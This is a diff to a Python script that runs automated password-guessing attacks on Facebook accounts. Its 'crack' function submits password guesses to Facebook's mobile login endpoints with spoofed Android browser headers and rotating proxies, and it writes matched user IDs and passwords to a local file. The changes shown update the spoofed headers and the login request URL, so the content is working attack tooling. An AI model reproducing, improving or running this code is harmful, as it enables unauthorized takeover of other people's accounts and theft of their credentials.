@@ -773,6 +773,36 @@ def passwrd():
     exit()
  
 #--------------------[ METODE-B-API ]-----------------#
+headers = {
+    'authority': 'p.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'raferer': 'https://p.facebook.com/?rtime=1711109997&hrc=1&wtsid=rdr_0dfrynSplnvjqJZcl&refsrc=deprecated&_rdr',
+    'user-agent': ua,
+    'viewport-width': '980',
+}
+
+response = requests.get(
+    'https://p.facebook.com/?rtime=1711109997&hrc=1&wtsid=rdr_0dfrynSplnvjqJZcl&refsrc=deprecated&_rdr',
+    cookies=cookies,
+    headers=headers,
+)
+
+
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
@@ -869,45 +899,45 @@ def crack(idf,pwv):
     'cache-control': 'max-age=0',
     'dpr': '2.75',
     'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-site',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
-    'raferer': 'https://p.facebook.com/',
     'upgrade-insecure-requests': '1',
+    'raferer': 'https://p.facebook.com/?rtime=1711109997&hrc=1&wtsid=rdr_0dfrynSplnvjqJZcl&refsrc=deprecated&_rdr',
     'user-agent': ua,
     'viewport-width': '980',
 }
             p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr').text
-            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://p.facebook.com/login/save-device/'"}
+	    dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://p.facebook.com/login/save-device/'"}
             ses.headers.update = {'authority': 'p.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
     'dpr': '2.75',
     'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-site',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
-    'raferer': 'https://p.facebook.com/',
     'upgrade-insecure-requests': '1',
+    'raferer': 'https://p.facebook.com/?rtime=1711109997&hrc=1&wtsid=rdr_0dfrynSplnvjqJZcl&refsrc=deprecated&_rdr',
     'user-agent': ua,
     'viewport-width': '980',
 }
-            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
+            po = ses.post('https://p.facebook.com/?rtime=1711109997&hrc=1&wtsid=rdr_0dfrynSplnvjqJZcl&refsrc=deprecated&_rdr',data=dataa,allow_redirects=False,proxies=proxs)
             if "checkpoint" in po.cookies.get_dict().keys():
                 #print(f'\r\x1b[32 \033[1;31m[DYAR-CP]\033[1;32m {idf} | {pw}')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
